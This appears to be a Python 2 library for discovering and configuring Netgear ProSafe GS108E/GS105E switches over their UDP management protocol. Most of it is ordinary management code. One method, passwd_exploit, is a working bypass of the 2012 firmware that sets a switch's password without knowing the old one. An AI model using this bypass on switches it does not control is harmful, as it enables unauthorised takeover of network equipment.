#!/usr/bin/python
# -*- coding: utf-8 -*-

"Main Class to communicate with gs108e and gs105e netgear switches"
import time
import binascii
import pprint
import random
import struct
import socket
import fcntl
import psl_typ
import inspect


def get_hw_addr(ifname):
    "gives the hardware (mac) address of an interface (eth0,eth1..)"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]


def get_ip_address(ifname):
    "returns the first ip address of an interface"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 0x8915 = SIOCGIFADDR
    return socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915,
                                        struct.pack('256s',
                                        ifname[:15]))[20:24])


def pack_mac(value):
    "packs the hardware address (mac) to the internal representation"
    if (len(value) == 17):
        return binascii.unhexlify(value[0:2] + value[3:5] + value[6:8] +
                                  value[9:11] + value[12:14] + value[15:17])
    if (len(value) == 12):
        return binascii.unhexlify(value)
    raise "unknown mac format=" + value


def unpack_mac(value):
    "unpack an internal representation to a hardware address"
    mac = binascii.hexlify(value)
    return (mac[0:2] + ":" + mac[2:4] + ":" + mac[4:6] + ":" + mac[6:8] +
            ":" + mac[8:10] + ":" + mac[10:12])


class ProSafeLinux:
    "Main class to communicate with a ProSafe gs108e gs105e Switch"
    CMD_MODEL = psl_typ.PslTypStringQueryOnly(0x0001, "model")
    CMD_FIMXE2 = psl_typ.PslTypHex(0x0002, "fixme2")
    CMD_NAME = psl_typ.PslTypString(0x0003, "name")
    CMD_MAC = psl_typ.PslTypMac(0x0004, "MAC")
    CMD_FIMXE5 = psl_typ.PslTypHex(0x0005, "fixme5")
    CMD_IP = psl_typ.PslTypIpv4(0x0006, "ip")
    CMD_NETMASK = psl_typ.PslTypIpv4(0x0007, "netmask")
    CMD_GATEWAY = psl_typ.PslTypIpv4(0x0008, "gateway")
    CMD_NEW_PASSWORD = psl_typ.PslTypPassword(0x0009, "new_password", True)
    CMD_PASSWORD = psl_typ.PslTypPassword(0x000a, "password", False)
    CMD_DHCP = psl_typ.PslTypDHCP(0x000b, "dhcp")
    CMD_FIXMEC = psl_typ.PslTypHex(0x000c, "fixmeC")
    CMD_FIRMWAREV = psl_typ.PslTypStringQueryOnly(0x000d, "firmwarever")
    CMD_FIMXEE = psl_typ.PslTypHex(0x000e, "fixmeE")
    CMD_FIXMEF = psl_typ.PslTypHex(0x000f, "fixmeF")
    CMD_REBOOT = psl_typ.PslTypAction(0x0013, "reboot")
    CMD_FACTORY_RESET = psl_typ.PslTypAction(0x0400, "factory_reset")
    CMD_SPEED_STAT = psl_typ.PslTypSpeedStat(0x0c00, "speed_stat")
    CMD_PORT_STAT = psl_typ.PslTypPortStat(0x1000, "port_stat")
    CMD_RESET_PORT_STAT = psl_typ.PslTypAction(0x1400, "reset_port_stat")
    CMD_TEST_CABLE = psl_typ.PslTypHexNoQuery(0x1800, "test_cable")
    CMD_TEST_CABLE_RESP = psl_typ.PslTypHexNoQuery(0x1c00, "test_cable_resp")
    CMD_VLAN_SUPPORT = psl_typ.PslTypVlanSupport(0x2000, "vlan_support")
    CMD_VLAN_ID = psl_typ.PslTypVlanId(0x2400, "vlan_id")
    CMD_VLAN802_ID = psl_typ.PslTypVlan802Id(0x2800, "vlan802_id")
    CMD_VLANPVID = psl_typ.PslTypVlanPVID(0x3000, "vlan_pvid")
    CMD_QUALITY_OF_SERVICE = psl_typ.PslTypQos(0x3400, "qos")
    CMD_PORT_BASED_QOS = psl_typ.PslTypPortBasedQOS(0x3800, "port_based_qos")
    CMD_BANDWIDTH_INCOMMING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x4c00, "bandwidth_in")
    CMD_BANDWIDTH_OUTGOING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x5000, "bandwidth_out")
    CMD_FIXME5400 = psl_typ.PslTypHex(0x5400, "fxime5400")
    CMD_BROADCAST_BANDWIDTH = psl_typ.PslTypBandwidth(0x5800,
                 "broadcast_bandwidth")
    CMD_PORT_MIRROR = psl_typ.PslTypPortMirror(0x5c00, "port_mirror")
    CMD_NUMBER_OF_PORTS = psl_typ.PslTypHex(0x6000, "number_of_ports")
    CMD_IGMP_SNOOPING = psl_typ.PslTypIGMPSnooping(0x6800, "igmp_snooping")
    CMD_BLOCK_UNKOWN_MULTICAST = psl_typ.PslTypBoolean(
                                              0x6c00, "block_unknown_multicast")
    CMD_IGMP_HEADER_VALIDATION = psl_typ.PslTypBoolean(0x7000,
        "igmp_header_validation")
    CMD_FIXME7400 = psl_typ.PslTypHex(0x7400, "fixme7400")
    CMD_END = psl_typ.PslTypEnd(0xffff, "END")

    CTYPE_QUERY_REQUEST = 0x0101
#    CTYPE_QUERY_RESPONSE = 0x0102
    CTYPE_TRANSMIT_REQUEST = 0x103
#    CTYPE_TRANSMIT_RESPONSE = 0x104

    RECPORT = 63321
    SENDPORT = 63322

    def __init__(self):
        "constructor"
        self.myhost = None
        self.srcmac = None
        self.ssocket = None
        self.rsocket = None

        self.seq = random.randint(100, 2000)
        self.outdata = {}
        self.debug = False
        self.mac_cache = {}
        self.cmd_by_id = {}
        self.cmd_by_name = {}
        for key, value in  inspect.getmembers(ProSafeLinux):
            if key.startswith("CMD_"):
                self.cmd_by_name[value.get_name()] = value
                self.cmd_by_id[value.get_id()] = value

    def bind(self, interface):
        "bind to an interface"
        self.myhost = get_ip_address(interface)
        self.srcmac = pack_mac(get_hw_addr(interface))

            # send socket
        self.ssocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # The following requires root permission so we do not do this:
        # self.socket.setsockopt(socket.SOL_SOCKET,
        #                               IN.SO_BINDTODEVICE,"eth1"+'\0')

        self.ssocket.bind((self.myhost, self.RECPORT))

        # recive socket
        self.rsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.rsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.rsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.rsocket.bind(("255.255.255.255", self.RECPORT))

    def get_query_cmds(self):
        "return all commands which can be used in a query"
        rtn = []
        for cmd in self.cmd_by_name.values():
            if cmd.is_queryable():
                rtn.append(cmd)
        return rtn

    def get_setable_cmds(self):
        "returns all commands which can be set"
        rtn = []
        for cmd in self.cmd_by_name.values():
            if cmd.is_setable():
                rtn.append(cmd)
        return rtn

    def get_cmd_by_name(self, name):
        "return a command by its name"
        return self.cmd_by_name[name]

    def set_debug_output(self):
        "set debugging"
        self.debug = True

    def recv(self, recvfunc, maxlen=8192, timeout=0.005):
        "receive a packet from the switch"
        self.rsocket.settimeout(timeout)
        try:
            message, address = self.rsocket.recvfrom(maxlen)
        except socket.timeout:
            return None
        if self.debug:
            print "recv=" + binascii.hexlify(message)
        if recvfunc is not None:
            recvfunc(message, address)
        self.recv(recvfunc, maxlen, timeout)

    def parse_packet(self, pack, unknown_warn):
        "unpack packet send by the switch"
        if self.debug:
            pprint.pprint(len(pack[2:4])) 
        data = {}
        if struct.unpack(">H", pack[2:4])[0] != 0x0000:
         data["error"] = struct.unpack(">H", pack[4:6])[0]
#        data["seq"] = struct.unpack(">H", pack[22:24])[0]
#        data["ctype"] = struct.unpack(">H", pack[0:2])[0]
#        data["mymac"] = binascii.hexlify(pack[8:14])
        data["theirmac"] = binascii.hexlify(pack[14:20])
        pos = 32
        cmd_id = 0
        while (pos<len(pack)):
            if self.debug:
                print "pos:%d len: %d" %(pos,len(pack))
            cmd_id = struct.unpack(">H", pack[pos:(pos + 2)])[0]
            if cmd_id in self.cmd_by_id:
                cmd = self.cmd_by_id[cmd_id]
            else:
                if unknown_warn:
                    print "Unknown Response %d" % cmd_id
                cmd = psl_typ.PslTypHex(cmd_id, "UNKNOWN %d" % cmd_id)
            pos = pos + 2
            cmdlen = struct.unpack(">H", pack[pos:(pos + 2)])[0]
            pos = pos + 2
            if cmdlen > 0:
                value = cmd.unpack_py(pack[pos:(pos + cmdlen)])
            else:
                value = None
            if cmd in data and value != None:
                if type(data[cmd]) != type(list()):
                    data[cmd] = [data[cmd]]
                data[cmd].append(value)
            elif value != None:
                data[cmd] = value
            if self.debug:
                print "cmd_id %d of length %d :" % (cmd_id, cmdlen) 
                print "data=" + binascii.hexlify(
                    pack[pos:(pos + cmdlen)])
            pos = pos + cmdlen
        return data

    def discoverfunc(self, msg, adr):
        "executed by discover to display any switch in the network"
        data = self.parse_packet(msg, True)
        dhcpstr = ""
        if (data[self.CMD_DHCP]):
            dhcpstr = " DHCP=on"
        print " * %s\t%s\t%s\t%s\t%s" % (data[self.CMD_MAC],
                                         data[self.CMD_IP],
                                         data[self.CMD_MODEL],
                                         data.get(self.CMD_NAME, ''),
                                         dhcpstr)

    def storediscoverfunc(self, msg, adr):
        "store discover ip"
        data = self.parse_packet(msg, True)
        if self.debug:
            print "Store MAC, IP: " + (data[self.CMD_MAC] + " " +
               data[self.CMD_IP])
        self.mac_cache[data[self.CMD_MAC]] = data[self.CMD_IP]
        #print " * %s\t%s\t%s\t%s\t%s" % (data[self.CMD_MAC],
        # data[self.CMD_IP], data[self.CMD_MODEL], data[self.CMD_NAME], dhcpstr)

    def transfunc(self, msg, adr):
        "analyse response, after transfer"
        #print "==FOUND SWITCH=="
        data = self.parse_packet(msg, True)
        if self.debug:
            pprint.pprint(data)
            if data["error"]:
                try:
                    print "Error with " + self.cmd_by_id(self.outdata["error"])
                except KeyError:
                    print "Unknown Error"
 
    def storefunc(self, msg, adr):
        "store data in outdata"
        self.outdata = self.parse_packet(msg, True)
        if self.debug:
            pprint.pprint(self.outdata)
            if self.outdata["error"]:
                try:
                    print "Error with " + self.cmd_by_id(self.outdata["error"])
                except KeyError:
                    print "Unknown Error"


    def rec_raw(self, msg, adr):
        "receive raw data"
        try:
            self.outdata = self.parse_packet(msg, False)
        except:
            pass
        self.outdata["raw"] = binascii.hexlify(msg)

    def send(self, host, port, data):
        "send data to host on port"
        if self.debug:
            print "send to ip " + host + " data = " + binascii.hexlify(data)
        self.ssocket.sendto(data, (host, port))
        self.seq += 1

    def baseudp(self, ctype, destmac):
        "Base UDP Package"
        reserved = "\x00"
        if destmac is None:
            destmac = 6 * "\x00"
        if len(destmac) > 6:
            destmac = pack_mac(destmac)
        data = (struct.pack(">h", ctype) + 6 * reserved + self.srcmac +
                     destmac + 2 * reserved)
        data += struct.pack(">h", self.seq)
        data += "NSDP" + 4 * reserved
        return data

    @staticmethod
    def addudp(cmd, datain=None):
        "Additional data to the base package"
        data = struct.pack(">H", cmd.get_id())
        if (datain is None):
            data += struct.pack(">H", 0)
        else:
            pdata = cmd.pack_py(datain)
            data += struct.pack(">H", len(pdata))
            data += pdata
        return data

    # why? we get the ip address in the reply back?
    def ip_from_mac(self, mac):
        "query for the ip of a switch with a given mac address"
        if mac is None:
            return "255.255.255.255"
        if mac in self.mac_cache:
            return self.mac_cache[mac]
        #print "mac="+mac
        # FIXME: Search in /proc/net/arp if mac there use this one
        #with open("/proc/net/arp") as f:
        # for line in f:
        #   print line
        query_arr = [self.CMD_MAC, self.CMD_IP]
        self.query(query_arr, mac, self.storediscoverfunc, use_ip_func=False)
        if mac in self.mac_cache:
            return self.mac_cache[mac]
        print "can't find mac: " + mac
        return "255.255.255.255"

    def query(self, cmd_arr, mac, func, use_ip_func=True):
        "get some values from the switch, but do not change them"
        if use_ip_func:
            ipadr = self.ip_from_mac(mac)
        else:
            ipadr = "255.255.255.255"
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_QUERY_REQUEST)
        for cmd in cmd_arr:
            data += self.addudp(cmd)
        data += self.addudp(self.CMD_END)
        self.outdata = {}
        self.send(ipadr, self.SENDPORT, data)
        self.recv(func)

    def transmit(self, cmd_arr, mac, func):
        "change something in the switch, like name, mac ..."
        ipadr = self.ip_from_mac(mac)
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
        if self.CMD_PASSWORD in cmd_arr:
            data += self.addudp(self.CMD_PASSWORD, cmd_arr[self.CMD_PASSWORD])
        for cmd, pdata in cmd_arr.items():
            if cmd != self.CMD_PASSWORD:
                data += self.addudp(cmd, pdata)
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)
        time.sleep(0.7)
        self.recv(func)

    def passwd(self, mac, old, new, func):
        "change password from old to new"
        # The Order of the CMD_PASSWORD and CMD_NEW_PASSWORD is important
        ipadr = self.ip_from_mac(mac)
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
        data += self.addudp(self.CMD_PASSWORD, old)
        data += self.addudp(self.CMD_NEW_PASSWORD, new)
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)
        time.sleep(0.7)
        self.recv(func)

    def passwd_exploit(self, mac, new, func):
        "exploit in current (2012) firmware version, set a new password"
        # The Order of the CMD_PASSWORD and CMD_NEW_PASSWORD is important
        ipadr = self.ip_from_mac(mac)
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
        data += self.addudp(self.CMD_NEW_PASSWORD, new)
        data += self.addudp(self.CMD_PASSWORD, new)
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)
        time.sleep(0.7)
        self.recv(func)
        
    def discover(self):
        "find any switch in the network"
        query_arr = [self.CMD_MODEL,
                   self.CMD_NAME,
                   self.CMD_MAC,
                   self.CMD_DHCP,
                   self.CMD_IP]
        self.query(query_arr, None, self.discoverfunc)
